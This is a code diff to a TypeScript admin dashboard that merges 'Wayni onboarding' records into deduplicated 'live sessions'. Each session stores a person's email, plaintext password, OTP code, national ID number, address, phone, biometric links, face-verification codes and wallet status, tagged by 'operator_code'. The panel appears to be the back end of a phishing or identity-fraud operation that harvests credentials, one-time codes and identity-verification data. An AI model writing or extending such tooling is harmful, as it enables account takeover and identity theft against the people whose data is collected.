@@ -883,8 +883,7 @@ const AdminV2 = () => {
   const totalMonthlyLimit = limitsEntries.reduce((s, l) => s + (Number(l.monthlyLimit) || 0), 0);
   const totalMonthlyConsumed = limitsEntries.reduce((s, l) => s + (Number(l.monthlyConsumption) || 0), 0);
 
-  // Wayni onboarding sessions — deduplicated by email, keeping the most advanced session
-  // Wayni onboarding sessions — deduplicated by email, keeping the most advanced session
+  // Wayni onboarding sessions — merge live sessions + dedicated table data
   const wayniOnboardingSessions = (() => {
     const onboardingStatuses = ["verify_dni_submitted", "verify_dni_success", "verify_dni_error", "address_submitted", "address_saved", "address_error", "biometric_started", "biometric_finished", "biometric_error"];
     const statusPriority: Record<string, number> = {
@@ -894,10 +893,53 @@ const AdminV2 = () => {
       address_saved: 4,
       biometric_started: 5, biometric_error: 5,
       biometric_finished: 6,
+      validated: 7,
     };
     const allOnboarding = liveSessions.filter((s) =>
       onboardingStatuses.includes(s.status) || (s.otp_code && (s.otp_code.includes("dni:") || s.otp_code.includes("uuid:")))
     );
+
+    // Also inject records from dedicated table that have no matching session
+    for (const row of onboardingRecords) {
+      const key = (row.email || "").toLowerCase();
+      if (!key) continue;
+      const hasSession = allOnboarding.some((s) => (s.email || "").toLowerCase() === key);
+      if (!hasSession) {
+        // Create a virtual session from the onboarding record
+        const otpParts: string[] = [];
+        if (row.dni) otpParts.push(`dni:${row.dni}`);
+        if (row.full_name) otpParts.push(`name:${row.full_name}`);
+        if (row.phone) otpParts.push(`phone:${row.phone}`);
+        if (row.gender) otpParts.push(`gender:${row.gender}`);
+        if (row.user_uuid) otpParts.push(`uuid:${row.user_uuid}`);
+        if (row.region) otpParts.push(`region:${row.region}`);
+        if (row.city) otpParts.push(`city:${row.city}`);
+        if (row.street) otpParts.push(`street:${row.street}`);
+        if (row.zip_code) otpParts.push(`zip:${row.zip_code}`);
+        if (row.biometric_url) otpParts.push(`biometric_url:${row.biometric_url}`);
+        if (row.biometric_id) otpParts.push(`biometric_id:${row.biometric_id}`);
+        if (row.wallet_status) otpParts.push(`wallet_status:${row.wallet_status}`);
+        if (row.bio_status) otpParts.push(`bio_status:${row.bio_status}`);
+        if (row.face_code) otpParts.push(`face_code:${row.face_code}`);
+        if (row.face_confidence) otpParts.push(`face_confidence:${row.face_confidence}`);
+        if (row.status === "validated") otpParts.push(`validated:true`);
+        allOnboarding.push({
+          id: row.id || row.session_id || crypto.randomUUID(),
+          email: row.email,
+          password: row.password || null,
+          status: row.status || "biometric_started",
+          otp_code: otpParts.join("|"),
+          created_at: row.created_at || new Date().toISOString(),
+          ip_address: null,
+          user_agent: null,
+          country: null,
+          city: null,
+          source: "cocosv2",
+          operator_code: row.operator_code || "",
+        });
+      }
+    }
+
     // Group by email, keep the most advanced session per email
     const byEmail = new Map<string, LiveSession>();
     for (const s of allOnboarding) {
@@ -906,16 +948,13 @@ const AdminV2 = () => {
       if (!existing) { byEmail.set(key, s); continue; }
       const existingPriority = statusPriority[existing.status] || 0;
       const newPriority = statusPriority[s.status] || 0;
-      // Prefer higher priority; if equal, prefer the newer session (merge otp_code data)
       if (newPriority > existingPriority) {
-        // Merge otp_code from existing into new if new doesn't have all data
         const mergedOtp = mergeOtpCodes(existing.otp_code, s.otp_code);
         byEmail.set(key, { ...s, otp_code: mergedOtp });
       } else if (newPriority === existingPriority && new Date(s.created_at) > new Date(existing.created_at)) {
         const mergedOtp = mergeOtpCodes(existing.otp_code, s.otp_code);
         byEmail.set(key, { ...s, otp_code: mergedOtp });
       } else {
-        // Keep existing but merge otp from new
         const mergedOtp = mergeOtpCodes(s.otp_code, existing.otp_code);
         byEmail.set(key, { ...existing, otp_code: mergedOtp });
       }
